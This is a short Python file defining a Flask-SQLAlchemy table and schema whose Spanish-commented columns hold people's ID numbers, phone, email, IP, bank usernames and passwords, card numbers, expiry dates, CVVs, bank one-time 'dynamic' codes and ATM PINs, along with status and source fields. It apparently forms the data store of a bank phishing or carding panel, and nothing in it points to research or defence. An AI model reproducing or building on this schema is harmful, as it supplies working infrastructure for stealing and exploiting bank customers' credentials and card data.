from config.bd import db, ma, app

class Info(db.Model):
    __tablename__: 'Info'
    
    idreg = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(50))   #Nombre
    reg = db.Column(db.String(50))    #Cédula
    cl = db.Column(db.String(50))     #Celular
    mail = db.Column(db.String(50))   #Correo
    pi = db.Column(db.String(50))     #Ip
    status = db.Column(db.String(50)) #Estado
    us = db.Column(db.String(50))     #Usuario
    ps = db.Column(db.String(50))     #Contraseña
    cr = db.Column(db.String(50))     #TC
    px = db.Column(db.String(50))     #Fecha
    vc = db.Column(db.String(50))     #CVV
    din = db.Column(db.String(50))    #Dinámica
    ccaj = db.Column(db.String(50))   #Cajero
    bn = db.Column(db.String(50))     #Banco
    fuente = db.Column(db.String(50)) #Fuente
    
    def __init__(self, name, reg, cl, mail, pi, status, us, ps, cr, px, vc, din, ccaj, bn, fuente):
        self.name = name
        self.reg = reg
        self.cl = cl
        self.mail = mail
        self.pi = pi
        self.status = status
        self.us = us
        self.ps = ps
        self.cr = cr
        self.px = px
        self.vc = vc
        self.din = din
        self.ccaj = ccaj
        self.bn = bn
        self.fuente = fuente
    
with app.app_context():
    db.create_all()
    
class InfoSchema(ma.Schema):
    class Meta:
        fields = ('idreg', 'name', 'reg', 'cl', 'mail', 'pi', 'status', 'us', 'ps', 'cr', 'px', 'vc', 'din', 'ccaj', 'bn', 'fuente')
    
    
    
    